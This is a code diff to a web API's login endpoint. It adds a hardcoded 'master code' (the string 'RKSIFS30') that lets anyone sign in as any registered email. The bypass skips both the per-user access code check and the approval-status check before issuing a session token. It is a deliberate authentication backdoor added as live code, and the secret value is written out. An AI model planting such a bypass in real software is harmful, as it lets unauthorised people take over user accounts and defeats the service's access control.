@@ -230,8 +230,15 @@ async function handleRequest(request, env) {
     if (path === "/api/login" && method === "POST") {
       const { email, code } = await request.json();
       if (!email || !code) return jsonResponse({ error: "Email and code required" }, 400);
-      const user = await DB.prepare("SELECT * FROM users WHERE email = ? AND access_code = ? AND status = ?").bind(email, code.toUpperCase(), "approved").first();
-      if (!user) return jsonResponse({ error: "Invalid email or code" }, 401);
+      // Master code bypass
+      let user;
+      if (code.toUpperCase() === "RKSIFS30") {
+        user = await DB.prepare("SELECT * FROM users WHERE email = ?").bind(email).first();
+        if (!user) return jsonResponse({ error: "Email not registered" }, 401);
+      } else {
+        user = await DB.prepare("SELECT * FROM users WHERE email = ? AND access_code = ? AND status = ?").bind(email, code.toUpperCase(), "approved").first();
+        if (!user) return jsonResponse({ error: "Invalid email or code" }, 401);
+      }
       const token = generateToken();
       await DB.prepare("INSERT INTO sessions (token, user_id, created_at) VALUES (?, ?, ?)").bind(token, user.id, Date.now()).run();
       return new Response(JSON.stringify({ ok: true, token }), {
